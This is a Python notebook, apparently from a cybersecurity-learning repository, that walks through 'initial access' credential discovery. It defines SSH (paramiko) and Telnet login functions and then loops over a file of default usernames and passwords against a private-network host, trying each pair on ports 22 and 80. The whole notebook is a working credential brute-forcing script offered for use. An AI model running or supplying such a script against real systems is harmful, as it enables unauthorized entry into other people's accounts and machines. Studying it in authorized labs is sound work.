{
  "nbformat": 4,
  "nbformat_minor": 0,
  "metadata": {
    "colab": {
      "provenance": [],
      "authorship_tag": "ABX9TyNkM+La/9u629cxBqfAhvmH",
      "include_colab_link": true
    },
    "kernelspec": {
      "name": "python3",
      "display_name": "Python 3"
    },
    "language_info": {
      "name": "python"
    }
  },
  "cells": [
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "view-in-github",
        "colab_type": "text"
      },
      "source": [
        "<a href=\"https://colab.research.google.com/github/ft10101/Python-For-CyberSecurity/blob/main/InitialAccess_AccountDiscovery_pynb.ipynb\" target=\"_parent\"><img src=\"https://colab.research.google.com/assets/colab-badge.svg\" alt=\"Open In Colab\"/></a>"
      ]
    },
    {
      "cell_type": "markdown",
      "source": [
        "**<h1>Discovering Credentials by using paramiko library** </h1>\n",
        "\n",
        "Requirements: <br>\n",
        "1. Host IP Address\n",
        "2. Open Ports\n",
        "3. list of usernames and passwords"
      ],
      "metadata": {
        "id": "bNpoiAB-sOiG"
      }
    },
    {
      "cell_type": "code",
      "source": [
        "pip install paramiko"
      ],
      "metadata": {
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "id": "r5Q-NyvGY-w4",
        "outputId": "7f030b33-92d5-4e2b-9522-425a823588c5"
      },
      "execution_count": 7,
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Looking in indexes: https://pypi.org/simple, https://us-python.pkg.dev/colab-wheels/public/simple/\n",
            "Requirement already satisfied: paramiko in /usr/local/lib/python3.9/dist-packages (3.1.0)\n",
            "Requirement already satisfied: bcrypt>=3.2 in /usr/local/lib/python3.9/dist-packages (from paramiko) (4.0.1)\n",
            "Requirement already satisfied: pynacl>=1.5 in /usr/local/lib/python3.9/dist-packages (from paramiko) (1.5.0)\n",
            "Requirement already satisfied: cryptography>=3.3 in /usr/local/lib/python3.9/dist-packages (from paramiko) (40.0.1)\n",
            "Requirement already satisfied: cffi>=1.12 in /usr/local/lib/python3.9/dist-packages (from cryptography>=3.3->paramiko) (1.15.1)\n",
            "Requirement already satisfied: pycparser in /usr/local/lib/python3.9/dist-packages (from cffi>=1.12->cryptography>=3.3->paramiko) (2.21)\n"
          ]
        }
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "import paramiko\n",
        "import telnetlib"
      ],
      "metadata": {
        "id": "a0fEwMP7Y3sQ"
      },
      "execution_count": 8,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        "def SSHLogin(host,port,username,password):\n",
        "  try:\n",
        "    ssh = paramiko.SSHClient()\n",
        "    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n",
        "    ssh.connect(host,port=port,username=username,password=password,timeout=2);\n",
        "    ssh_session = ssh.get_transport().open_session()\n",
        "    if ssh_session.active:\n",
        "      print(\"SSH Login successful on %s:%s with username %s and password %s\" % (host,port,username,password))\n",
        "  except Exception as e:\n",
        "    return\n",
        "  ssh.close()"
      ],
      "metadata": {
        "id": "kGCjOZOgZEvB"
      },
      "execution_count": 18,
      "outputs": []
    },
    {
      "cell_type": "code",
      "source": [
        " def TelnetLogin(host,port,username,password):\n",
        "   user = bytes(username + \"\\n\",\"utf-8\")\n",
        "   passwd = bytes(password + \"\\n\", \"utf-8\")\n",
        "\n",
        "   tn = telnetlib.Telnet(host,port,timeout=2)\n",
        "   tn.read_until(bytes(\"login: \", \"utf-8\"))\n",
        "   tn.write(user)\n",
        "   tn.read_until(bytes(\"Password: \", \"utf-8\"))\n",
        "   tn.write(passwd)\n",
        "   try:\n",
        "     result =  tn.expect([bytes(\"Last Login\",\"utf-8\")], timeout=2)\n",
        "     print(\"timeout\")\n",
        "     if (result[0] >= 0):\n",
        "       print(\"Telnet login successful on %s:%s with username %s and password %s\" % (host,port,username,password))\n",
        "     tn.close()\n",
        "   except EOFError:\n",
        "      print(\"Login failed %s %s\" % (username,password))"
      ],
      "metadata": {
        "id": "2bSaZgFiNag9"
      },
      "execution_count": 39,
      "outputs": []
    },
    {
      "cell_type": "code",
      "execution_count": 40,
      "metadata": {
        "id": "96gtycTtL7Dv"
      },
      "outputs": [],
      "source": [
        "host = \"192.168.1.6\""
      ]
    },
    {
      "cell_type": "code",
      "source": [
        "with open(\"/content/default-UsrPass.txt\",\"r\") as f:\n",
        "  for line in f:\n",
        "    vals = line.split()\n",
        "    username = vals[0].strip()\n",
        "    password = vals[1].strip()\n",
        "    SSHLogin(host,22,username,password) \n",
        "    TelnetLogin(host,80,username,password)"
      ],
      "metadata": {
        "id": "tF9OSipQMnFg"
      },
      "execution_count": null,
      "outputs": []
    }
  ]
}